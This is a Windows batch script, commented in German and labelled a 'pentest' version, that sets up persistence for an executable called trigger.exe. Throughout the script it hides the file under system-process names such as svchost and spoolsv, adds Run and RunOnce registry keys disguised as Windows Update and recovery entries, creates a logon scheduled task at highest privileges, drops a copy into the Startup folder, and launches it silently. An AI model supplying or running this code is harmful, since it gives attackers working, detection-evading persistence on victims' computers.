@echo off
REM Verbesserte Persistenzmethoden für Windows (Pentest-Version)

REM === Konfiguration ===
setlocal EnableDelayedExpansion

REM Zufällige Namen (minimale Erkennung)
set "basename=svchost"
set /a rand=%random% * 1000 + 1000
set "filename=%basename%_%rand%.exe"
set "taskname=WinTask_%rand%"

REM Zielpfade
set "targetDir=%APPDATA%\Microsoft\Windows\Themes"
set "targetPath=%targetDir%\%filename%"

REM Quelldatei (liegt im selben Verzeichnis)
set "sourceFile=trigger.exe"

REM === Kopieren der Quelldatei an Zielort ===
if not exist "%targetDir%" mkdir "%targetDir%"
copy /y "%sourceFile%" "%targetPath%" >nul

REM === Persistenzmethoden ===

REM 1. Registry: HKCU Run
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate_%rand%" /t REG_SZ /d "%targetPath%" /f >nul

REM 2. Registry: RunOnce als Fallback
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SysRecovery_%rand%" /t REG_SZ /d "%targetPath%" /f >nul

REM 3. Scheduled Task (OnLogon, höchste Rechte)
schtasks /create /tn "%taskname%" /tr "\"%targetPath%\"" /sc onlogon /rl highest /f >nul 2>nul

REM 4. Autostart-Ordner (Kopie als Tarnung)
set "startupDir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%startupDir%" mkdir "%startupDir%"
copy /y "%targetPath%" "%startupDir%\spoolsv.exe" >nul

REM === Optional: Sofort starten (silent) ===
start "" /b "%targetPath%"

endlocal
exit